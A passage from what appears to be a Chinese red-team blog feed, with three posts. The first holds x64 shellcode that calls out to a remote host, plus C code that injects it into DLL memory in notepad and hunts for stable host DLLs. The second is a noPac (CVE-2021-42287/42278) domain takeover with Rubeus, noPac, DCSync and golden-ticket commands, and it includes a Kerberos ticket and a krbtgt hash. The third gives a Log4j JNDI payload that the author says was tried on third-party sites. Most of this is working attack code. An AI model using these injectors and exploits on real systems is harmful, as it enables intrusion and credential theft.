\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x41\x55\x53\x74\x00\x50\x3b\xee\xb2\x1e\xaf\x7b\x8f\xea\x2c\xc7\x03\x8a\xe7\x01\x52\x2d\x36\x42\x10\xdd\x4f\xd5\x10\x29\x0a\x34\x71\x55\x7a\x57\x16\x7b\x4e\xf0\x72\x78\xf7\x03\x64\xcd\x76\x26\x3d\x72\x2c\x3b\x61\x37\x22\xba\x56\xd9\x08\xa9\xf1\x4b\x07\xea\xf3\xd3\x37\xc7\x2e\x72\x78\x95\xa6\x04\x84\xd9\xf2\xa7\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4e\x50\x30\x38\x3b\x20\x4d\x41\x41\x55\x3b\x20\x4e\x50\x30\x38\x29\x0d\x0a\x00\x1e\x20\xa6\xba\x38\x5d\xf2\x48\xf5\x8a\xd0\xe1\x67\x11\x2c\x89\x1e\x13\x84\xfd\x3b\x1b\x2a\x76\xcc\xe3\x06\x10\xdb\xcb\x91\x3a\xbe\x47\xce\x62\xb6\x30\x67\x3a\x1a\x4d\xcb\x60\x6b\x61\x47\x54\x5f\x23\x37\x02\xda\xd6\x4c\x64\xb5\x28\x25\xc9\x15\x17\x78\x86\x24\x71\xdb\xf0\x39\x02\xdf\xcc\x96\xd6\x0a\x28\xb0\xe8\xea\x5c\xa2\x21\xe4\xb9\x01\x98\xf7\x53\x52\x2c\xe3\x6f\x0e\x94\xf9\x6b\x81\x19\x67\xd4\x1a\x0d\xa8\x9b\xe5\x08\x1c\x3d\x14\xe1\x78\x91\xa6\xa4\x4b\x7b\x55\x4e\x8e\x44\xb6\x2c\xe2\xce\x6f\x23\x66\x09\x1b\x78\xb5\xe0\xec\x35\x28\xd0\x27\x6c\xde\xf1\xd3\xb5\xbd\xb3\xe8\x23\x7e\x0f\x69\xa2\x57\x57\x7d\x8c\x2f\xb3\x32\x45\x84\x2a\x6a\x2d\xde\xa0\xdd\xc0\x8a\x78\x36\x20\xbb\xa5\x35\xc4\x19\x2a\x03\x66\x25\xc7\xc0\xdd\xc8\x53\x37\x97\x6d\xb4\x8a\x30\xba\xad\xfe\x09\xe6\xbf\xae\x80\x7c\xdb\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x31\x30\x30\x2e\x31\x30\x30\x2e\x35\x2e\x37\x33\x00\x00\x08\xc3\x27&quot;;int PrintModules(HANDLE hProcess, DWORD processID){        printf(&quot;inject PID:%d\n&quot;,processID);        CHAR targetdll[] = &quot;uxtheme.dll&quot;;        CHAR dllname[1024] = { 0 };        DWORD oldProtect;        MODULEENTRY32 moduleEntry;        HANDLE handle = NULL;        handle = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID); //  获取进程快照中包含在th32ProcessID中指定的进程的所有的模块。        if (!handle) {               CloseHandle(handle);               return NULL;        }        ZeroMemory(&amp;moduleEntry, sizeof(MODULEENTRY32));        moduleEntry.dwSize = sizeof(MODULEENTRY32);        if (!Module32First(handle, &amp;moduleEntry)) {               CloseHandle(handle);               return NULL;        }        do {               sprintf(dllname, &quot;%ws&quot;, moduleEntry.szModule);        //      printf(&quot;%s\n&quot;, dllname);               if (strcmp(dllname, targetdll) == 0) {                       printf(&quot;find DLL:%s\n&quot;,targetdll);                       BYTE *Address = moduleEntry.modBaseAddr + 4096;                       printf(&quot;DLL Address:0x%x\n&quot;,Address);                       VirtualProtectEx(hProcess, Address, sizeof(buf), 0x04,  &amp;oldProtect);                       WriteProcessMemory(hProcess, Address, buf, sizeof(buf), NULL);                       VirtualProtectEx(hProcess, Address, sizeof(buf), 0x20,  &amp;oldProtect);                       CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE)Address, NULL, 0, NULL);                       printf(&quot;[+] inject shellcode sucess\n&quot;);               }        } while (Module32Next(handle, &amp;moduleEntry));        CloseHandle(handle);        return 0;}int main(){        char targetname[] = &quot;C:\\Windows\\System32\\notepad.exe&quot;;        STARTUPINFOA si = { 0 };        PROCESS_INFORMATION pi = { 0 };        bool ct=CreateProcessA(targetname, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE,  NULL, NULL, &amp;si, &amp;pi);        if (ct == false) {               printf(&quot;CreateProcess Fuck Error Code:%d\n&quot;,GetLastError());               exit(0);        }        Sleep(2000);        PrintModules(pi.hProcess,pi.dwProcessId);        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YoFKg.png" alt=""></p><p>uxtheme.dll和msvcp_win.dll win10基本每个进程都加载了<br><img src="https://s4.ax1x.com/2022/01/16/7YoYI1.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YoUG6.png" alt=""></p><p>插打印机和Defender都行<br><img src="https://s4.ax1x.com/2022/01/16/7Yo2JP.png" alt=""></p><p>寻找稳定DLL（适用于win10）</p><pre><code class="c">// demoinject.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;#include &lt;psapi.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;winnt.h&gt;#include &lt;map&gt;#include &lt;iostream&gt;using namespace std;map &lt;string, int&gt; dlllist;map&lt;string, int&gt;::iterator iter;unsigned char buf[] =&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;&quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;&quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;&quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;&quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;&quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;&quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;&quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;&quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;&quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;&quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;&quot;\x63\x2e\x65\x78\x65\x00&quot;;char taskname[] = &quot;Calculator.exe&quot;;#define ErrorPrint(text,code){printf(&quot;Error:%s ErrorCode:%d\n&quot;,text,code);}int IsExistProcess(CONST CHAR* szProcessName){        PROCESSENTRY32 processEntry32;        char pname[1024] = { 0 };        HANDLE toolHelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);        if (((int)toolHelp32Snapshot) != -1)        {               processEntry32.dwSize = sizeof(processEntry32);               if (Process32First(toolHelp32Snapshot, &amp;processEntry32))               {                       do                       {                              sprintf(pname, &quot;%ws&quot;, processEntry32.szExeFile);                              if (strcmp(szProcessName, pname) == 0)                              {                                      return processEntry32.th32ProcessID;                              }                       } while (Process32Next(toolHelp32Snapshot, &amp;processEntry32));               }               CloseHandle(toolHelp32Snapshot);        }        return FALSE;}int PrintModules(HANDLE hProcess,DWORD processID){        int id = 0;        CHAR currnetname[1024] = {0};        CHAR dllname[1024] = {0};        DWORD oldProtect;        MODULEENTRY32 moduleEntry;        HANDLE handle = NULL;        handle = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, processID); //  获取进程快照中包含在th32ProcessID中指定的进程的所有的模块。        if (!handle) {               CloseHandle(handle);               return NULL;        }        ZeroMemory(&amp;moduleEntry, sizeof(MODULEENTRY32));        moduleEntry.dwSize = sizeof(MODULEENTRY32);        if (!Module32First(handle, &amp;moduleEntry)) {               CloseHandle(handle);               return NULL;        }        do {               sprintf(dllname, &quot;%ws&quot;, moduleEntry.szModule);               if (id == 0) {                       sprintf(currnetname, &quot;%s&quot;, dllname);               }               id += 1;               if (strcmp(dllname, currnetname) != 0) {                       if (dlllist.find(dllname) == dlllist.end()) {                              //             printf(&quot;%s 0x%x\n&quot;,dllname,  moduleEntry.hModule);                              BYTE *Address = moduleEntry.modBaseAddr + 4096;                              VirtualProtectEx(hProcess, Address, sizeof(buf), 0x04,  &amp;oldProtect);                              WriteProcessMemory(hProcess, Address, buf, sizeof(buf),  NULL);                              VirtualProtectEx(hProcess, Address, sizeof(buf), 0x20,  &amp;oldProtect);                              CreateRemoteThread(hProcess, NULL, 0,  (LPTHREAD_START_ROUTINE)Address, NULL, 0, NULL);                              MEMORY_BASIC_INFORMATION baseinfo;                              VirtualQueryEx(hProcess, Address, &amp;baseinfo,  sizeof(baseinfo));                              Sleep(5000);                              int currentpid = IsExistProcess(currnetname);                              //printf(&quot;the pid:%d %d\n&quot;, processID, currentpid);                              if (dlllist.find(dllname) == dlllist.end()) {                                      int kpid = IsExistProcess(taskname);                                      if (kpid) {                                             dlllist.insert(pair &lt;string, int &gt;(dllname,  true));                                             printf(&quot;found DLL run shellcode ok:%s,but dll  is GG?\n&quot;, dllname);                                             HANDLE  kHprocess=OpenProcess(PROCESS_ALL_ACCESS, FALSE, kpid);                                             TerminateProcess(kHprocess, 0);                                             Sleep(2000);                                             //return TRUE;                                             if (currentpid == processID) {                                                     printf(&quot;Found valid candidate:%s,  region size available on the .text section: 0x%x\n&quot;, dllname, baseinfo.RegionSize);                                                     return TRUE;                                             }                                             else {                                                     printf(&quot;Fuck DLL:%s\n&quot;, dllname);                                                     dlllist.insert(pair &lt;string, int  &gt;(dllname, false));                                                     return FALSE;                                             }                                      }else {                                             printf(&quot;Fuck DLL:%s\n&quot;, dllname);                                             dlllist.insert(pair &lt;string, int &gt;(dllname,  false));                                             return FALSE;                                      }                              }                       }               }        } while (Module32Next(handle, &amp;moduleEntry));        CloseHandle(handle);        return 0;        /*        HANDLE hProcess;        DWORD cbNeeded;        HMODULE hmodules[MAX_PATH] = {};        DWORD hmodulesize = sizeof(hmodules);        DWORD hmodulesizeneeded = 0;        HMODULE rmodule = NULL;        CHAR rmoduleName[MAX_PATH] = {};        unsigned int i;        printf(&quot;Process ID: %u\n&quot;, processID);        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,FALSE,  processID);        if (NULL == hProcess) {               ErrorPrint(&quot;Rows:20 OpenProcess&quot;, GetLastError());        }        printf(&quot;\nOpenProcess:0x%x\n&quot;,hProcess);        bool MeiJu=EnumProcessModules(hProcess, hmodules, hmodulesize,  &amp;hmodulesizeneeded); //获取进程加载的所有模块句柄数量        if (MeiJu != true) {               ErrorPrint(&quot;Rows:24 EnumProcessModules&quot;, GetLastError());        }        printf(&quot;\nModuleCount:%d\n&quot;,(hmodulesizeneeded / sizeof(HMODULE)));        for (int calc = 0;calc &lt; (hmodulesizeneeded / sizeof(HMODULE));calc++) {               rmodule = hmodules[calc];               GetModuleFileNameExA(hProcess, rmodule, rmoduleName, sizeof(rmoduleName));  //获取模块名称               HMODULE  BaseAddress = GetModuleHandleA((LPCSTR)rmoduleName)+4096; //DLL加载起始地址               if (BaseAddress == NULL) {                       ErrorPrint(&quot;Rows:32 GetModuleBaseNameA&quot;,GetLastError());               }               printf(&quot;%s BaseAddress:0x%x\n&quot;, rmoduleName, BaseAddress);        }        CloseHandle(hProcess);        return 0;        */}int main(){        bool Ctprocess;        STARTUPINFOA si = { 0 };        PROCESS_INFORMATION pi = { 0 };        si.cb = sizeof(si);        char processname[] = &quot;C:\\Windows\\System32\\notepad.exe&quot;;        DWORD cbNeeded;        HMODULE hmodules[MAX_PATH] = {};        DWORD hmodulesize = sizeof(hmodules);        DWORD hmodulesizeneeded = 0;        HMODULE rmodule = NULL;        int modulecount;        Ctprocess = CreateProcessA(processname, NULL, NULL, NULL, FALSE,  CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);        Sleep(2000);        bool MeiJu = EnumProcessModules(pi.hProcess, hmodules, hmodulesize,  &amp;hmodulesizeneeded); //获取进程加载的所有模块句柄数量        if (MeiJu != true) {               ErrorPrint(&quot;Rows:24 EnumProcessModules&quot;, GetLastError());        }        modulecount = hmodulesizeneeded / sizeof(HMODULE);        printf(&quot;module count:%d\n&quot;, modulecount);        TerminateProcess(pi.hProcess, 0);        Sleep(2000);        for (int calc = 0;calc &lt; modulecount;calc++) {        //      printf(&quot;frequency:%d\n&quot;,calc);               si = { 0 };               pi = { 0 };               Ctprocess = CreateProcessA(processname, NULL, NULL, NULL, FALSE,  CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);               if (Ctprocess != true) {                       ErrorPrint(&quot;Rows:14 CreateProcessA&quot;, GetLastError());               }               int Ctprocesspid = pi.dwProcessId;               Sleep(2000);               int kt = PrintModules(pi.hProcess, Ctprocesspid);               if (kt == 1) {                       break;               }        }        /*        if (TerminateProcess(pi.hProcess,0) != true) {               ErrorPrint(&quot;Rows:53 TerminateProcess&quot;,GetLastError());        }        printf(&quot;Kill Process\n&quot;);        */        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7Yo5LQ.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;被几个吊毛同事催着更博客，立刻更了一篇 (&lt;/p&gt;
&lt;h2 id=&quot;利用NtMapViewOfSection来加载DLL&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-42287/CVE-2021-42278 域内翻身做主人</title>
    <link href="http://422926799.github.io/posts/f591678b.html"/>
    <id>http://422926799.github.io/posts/f591678b.html</id>
    <published>2021-12-14T17:11:47.000Z</published>
    <updated>2021-12-14T17:31:46.036Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>原理：<br>创建一个机器用户 xxx 带$ 的 ，然后 这个用户的 sAMAccountName  == dc  获取一个DC的票据之后 再改回  sAMAccountName  ==  xxx 接着导入票据到本地<br>参考链接:<br><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html" target="_blank" rel="noopener">https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html</a><br><a href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>yayi.local - windows server 2012(DC) HostName:WIN-5CHMN9C4UES<br>域内机器:win7<br>普通用户:jk Hxc123456</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>检测能否利用：<br>默认情况下，它是10，但可以更改，高于0 的任何内容都可以。</p><pre><code>Get-DomainObject | findstr ms-ds-machine</code></pre><p><img src="https://static.aichat.net/chat/202112/e5f12adc-6349-4cc0-a7f9-fb0cbc3b1fb6.png" alt=""></p><p>最后，我们需要检查默认情况下授予经过身份验证的用户的SeMachineAccountPrivilege</p><pre><code>邪法:whoami /user #取出来的ID第4位进行-10  SID:S-1-5-21-2799505025-1944254007-2887416074-500ConvertFrom-SID S-1-5-11</code></pre><p><img src="https://static.aichat.net/chat/202112/3868861c-2415-4341-a30b-a72dad829516.png" alt=""></p><p>手动利用:</p><ul><li>Powermad</li><li>Rubeus</li></ul><pre><code>#创建机器用户$password = ConvertTo-SecureString &#39;ComputerPassword&#39; -AsPlainText -ForceNew-MachineAccount -MachineAccount &quot;Eva&quot; -Password $($password) -Domain &quot;yayi.local&quot; -DomainController &quot;WIN-5CHMN9C4UES.YAYI.local&quot; -Verbose#清除SPN信息Set-DomainObject &quot;CN=Eva,CN=Computers,DC=yayi,DC=local&quot; -Clear &#39;serviceprincipalname&#39; -Verbose#重命名新建机器名为DC机器名Set-MachineAccountAttribute -MachineAccount &quot;Eva&quot; -Value &quot;WIN-5CHMN9C4UES&quot; -Attribute samaccountname -Verbose#获取TGTRubeus.exe asktgt /user:&quot;WIN-5CHMN9C4UES&quot; /password:&quot;ComputerPassword&quot; /domain:&quot;yayi.local&quot; /dc:&quot;WIN-5CHMN9C4UES.yayi.local&quot; /nowrap#改回原来的计算机名Set-MachineAccountAttribute -MachineAccount &quot;Eva&quot; -Value &quot;Eva&quot; -Attribute samaccountname -Verbose#Request S4U2self（获取票据）Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:WIN-5CHMN9C4UES.yayi.local /self /altservice:LDAP/WIN-5CHMN9C4UES.yayi.local /ptt /ticket:doIFJDCCBSCgAwIBBaEDAgEWooIEODCCBDRhggQwMIIELKADAgEFoQwbCllBWUkuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnlheWkubG9jYWyjggP0MIID8KADAgESoQMCAQKiggPiBIID3o63EAl/yUgDHQmpBMWzqmvewt4GpUMUik4+5+s6gv16FRxloS4LplB1VwDs3iqATa4M5+Toko9kp5jHX9M0vGRekAlWb9VS+N97mEySMMQxAGIFhwV2xI4UAiZxiNLa6W7jGW9M5/z5StTXTcH7WVNOgA3NIxbGO8UWu+Ezk6wbcLKaA/Cm5hh7T2B2i8BrZzbD9uTSGXnJZRRv+HTpiv9+mq8FFPjO99qiu3VvK0XJYW3lKFvKLUVFwQidsUzvI2xD1jbtG6WADp9kbYoi5Tbj6PsWTXoU/rtaaZmIMdAfQgXrTIZob99HdwoKGS0ICNqhy1TGLRIWOgofopOhHlf99wbtVVneVytACl18O0QXnLP+BPePaSfJTXBdcdcQVBgZM1M7z/bQFqlNyCTDS2NQwgak0iDSHv/c0tstbxCqqEA1EQ8X28N1ENx0zgvPA4rOUNaQlBpZv9SSPQEkb0Ca13yHo9INdkZ4637YzGXVYuAXT2/wH2BQ7AVOQvetwlsY7CNJ2p5FcgYEYAwkmqurF/1DTMKJsRkWhstBWqvSXbHRsk0bxrC6uR7qX45rFweg7Q9FLI4t7Iv+pMFJjDUxJXRETaXq7ASHFpWULtmMB2LqTPc+igqUstiZOIAHTYN3xuShCyd1Hq17ISHl3iQOLK1BUhdJVgveaG+RguTvgGQ9Z6IyzqbORrnO6aA9JINoqhvgxTmeBfP7JmY5Ll8xHRMxMsEz+fD66RGAg6HVW4cwAbQLZePxuOBo/oclpsh8HPLuLEi7EKCgerSu/ANkIo2jzk9+RPl4+wABXriaRzn7sl+MRTV0r30jCXe3hwyii9QWw4MSzsRpR7zF2oD2n9yDS7wMjAj8/4YUwySnqyaerVsfqreHEN3CgIf+Fp4ZL8Dm8w1bMQ4msfJUm6+s51E8W7FzOOLXA18SD6Qb9xZOFqor+JapyeqCfJj20ShCGlxBA73srP5AkNbI8OduTP52GcvVYmNLT1jJI7LLi0gE4tVjE336H1KHkSukvfK1r2r3E1thiafWjQO1CMn1g8o0HwN3jW6LwdRGuhz2m+ocoq5KE3TxdYxI1vjFqlCKns9FkMWXslw5SytOqYtEicBUPNa17J3d3QadF7l7VYJWtEw6xAeB9F29WTaRaJCL8s7ghh06K27FwxLheIUukdwgOsMpJttkiJtUI+0u97gzQlIkSd2jb8tGdDnpRITi2LTwg1vvpmSvaGMQdZ+Oash27JHktjQwMHArrMM1mjtI1cQUgOdaRZGXpbdh7ThTdJwopaJQYdNsCIJ9poJNOhLXw+IM8m9RyDdxeKOB1zCB1KADAgEAooHMBIHJfYHGMIHDoIHAMIG9MIG6oBswGaADAgEXoRIEELSllXk3Qm2tX3lpkSuPLWShDBsKWUFZSS5MT0NBTKIcMBqgAwIBAaETMBEbD1dJTi01Q0hNTjlDNFVFU6MHAwUAQOEAAKURGA8yMDIxMTIxMjIwNDE0MVqmERgPMjAyMTEyMTMwNjQxNDFapxEYDzIwMjExMjE5MjA0MTQxWqgMGwpZQVlJLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwp5YXlpLmxvY2Fs#DCSync (DCSync krbtgt hash伪造黄金票据等选择)lsadump::dcsync /user:yayi\krbtgt</code></pre><p><img src="https://static.aichat.net/chat/202112/73d0b4c5-3853-413a-9afe-63796bfb270a.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/c9af7c4c-52ef-420c-9a0e-9a5df398433c.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/45b40aad-892e-408f-8390-a5f99aec132f.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/7c05acaa-c3a9-4655-896d-dd47e4d1b8de.png" alt=""></p><p>票据检查:<br><img src="https://static.aichat.net/chat/202112/7c696639-6049-4a03-8db5-23fae9abaa96.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/e5385b26-cb22-439a-9bc3-7a5269071b64.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/84071697-f640-4aee-afbe-e4f4e5933f23.png" alt=""></p><p>nopac:<br><a href="https://github.com/cube0x0/noPac" target="_blank" rel="noopener">https://github.com/cube0x0/noPac</a></p><pre><code>noPac.exe -dc WIN-5CHMN9C4UES.YAYI.local -mAccount evilpc -mPassword 123.com /service ldap /pttMimikatz &quot;lsadump::dcsync /user:yayi\krbtgt&quot;92b27a8d7877a2e27cf095e9c136b3c390e9162d9af8c9cabf46f2541931b13fffa2a2de964980d44a3ad73e3771ff36mimikatz &quot;kerberos::golden /domain:yayi.local /sid:S-1-5-21-2799505025-1944254007-2887416074 /aes256:90e9162d9af8c9cabf46f2541931b13fffa2a2de964980d44a3ad73e3771ff36 /user:sb /ptt&quot; exit</code></pre><p><img src="https://static.aichat.net/chat/202112/c05157b5-da40-47ad-8a5c-334e837c708e.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/ec8e38af-49e8-4c8a-9197-e3e01fb14dfa.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/612200c3-1100-4c1a-8adf-940e01b3b555.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/2cfb451d-7577-4f8d-af68-4d7ed287873b.png" alt=""></p><p>impacket复现，没成功</p><pre><code>python3 addcomputer.py -computer-name fakename -computer-pass &#39;Passw0rd!&#39; -dc-ip 192.168.93.136 -dc-host WIN-5CHMN9C4UES.yayi.local yayi.local/jk:&#39;Hxc123456&#39;python3 renameMachine.py yayi.local/jk:&#39;Hxc123456&#39; -dc-ip 192.168.93.136 -current-name &#39;fakename$&#39; -new-name WIN-5CHMN9C4UESpython3 getTGT.py yayi.local/WIN-5CHMN9C4UES:&#39;Passw0rd!&#39; -dc-ip 192.168.93.136python3 renameMachine.py yayi.local/jk:&#39;Hxc123456&#39; -dc-ip 192.168.93.136 -current-name &#39;WIN-5CHMN9C4UES&#39; -new-name fakename$python3 getST.py -spn cifs/WIN-5CHMN9C4UES.yayi.local -impersonate admin -dc-ip 192.168.93.136 yayi.local/fakename$:passw0rd!python3 secretsdump.py -k -no-pass WIN-5CHMN9C4UES.yayi.local -just-dc</code></pre><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>解决此问题的最佳方法是安装 Microsoft 补丁 ( KB5008602 )，此补丁修复了 PAC 混淆的问题，并修复了由早期 KB5008380 补丁创建的 S4U2self 的此问题。<br>将机器帐户配额设置为0是阻止低权限用户创建机器帐户的快速而简单的解决方法，另一个相关的解决方法是从SeMachineAccountPrivilege 中删除Authenticated Users并添加域管理员或另一组允许的帐户。<br>由各种步骤引起的多个事件对于确定执行此攻击的尝试非常有用。确定这些事件的功劳完全归功于Andrew Schwartz，我只是在执行攻击后将我的日志发送给他。</p><p><img src="https://static.aichat.net/chat/202112/59927b79-aa84-4ff0-8b3f-47ea959f0acd.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;原理：&lt;br&gt;创建一个机器用户 xxx 带$ 的 ，然后 这个用户的 sAMAccountName  == dc  获取一个DC的票据之后 </summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>log4j漏洞复现</title>
    <link href="http://422926799.github.io/posts/98d13101.html"/>
    <id>http://422926799.github.io/posts/98d13101.html</id>
    <published>2021-12-14T16:38:49.000Z</published>
    <updated>2021-12-14T17:09:38.931Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Log4j-2中存在JNDI注入漏洞，当程序将用户输入的数据被日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。鉴于此漏洞危害较大，建议客户尽快采取措施防护此漏洞。</p><p>经分析，log4j2是全球使用广泛的java日志框架，同时该漏洞还影响很多全球使用量的Top序列的通用开源组件，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响</p><p><strong>影响版本:Apache Log4j 2.x &lt;= 2.14.1</strong><br><img src="https://static.aichat.net/chat/202112/4a24af97-d778-4b04-a26c-6021a07e000e.png" alt=""></p><p>漏洞利用条件：</p><pre><code>core和api同时调用才可以利用成功，对于lombok这种方式却不行</code></pre><p>jdk版本限制<br><img src="https://static.aichat.net/chat/202112/7f779424-3bf0-4c58-9413-a14ea4ef06e8.png" alt=""></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>181和之前的利用  是ldap-&gt;发送重定向到class-&gt;远程加载class执行</p><p>限制:<br>限制了远程加载class,被限制的版本只能接受ldap的结果,不接受加载远程class</p><p>高版本的绕过：<br>绕过是ldap直接发送调用本地el库执行，不再发送重定向class，不加载远程类，ldap查询还是会发</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>POC</p><pre><code>${jndi:ldap://x.4j2a.dnslog.cn/exp} #有登录框就插，判断是否有回显 （有代表可能可以利用）</code></pre><p>当天晚上测试的 （亚马逊，网易云，京东，icound等等）<br><img src="https://static.aichat.net/chat/202112/ef86937d-6b9d-4300-b62f-2f4eafa80090.png" alt=""></p><p><img src="https://static.aichat.net/chat/202112/e8b79e36-ebd7-4485-b4a2-c0ca4ac72fec.png" alt=""></p><p>本地测试环境:JDK_1.8.0_181和JDK_1.8.0_191 | 对应：8u181、8u191<br>Main.java</p><pre><code class="java">package com.company;import java.io.*;import org.apache.logging.log4j.Logger;import org.apache.logging.log4j.LogManager;public class Main {    public static final Logger logger = LogManager.getLogger(Main.class);    public static void main(String[] args) {        System.out.println(&quot;Start&quot;);        logger.error(&quot;${lower:${jndi:rmi://127.0.0.1:1099/wlzyww}}&quot;);    }}</code></pre><p>8u191 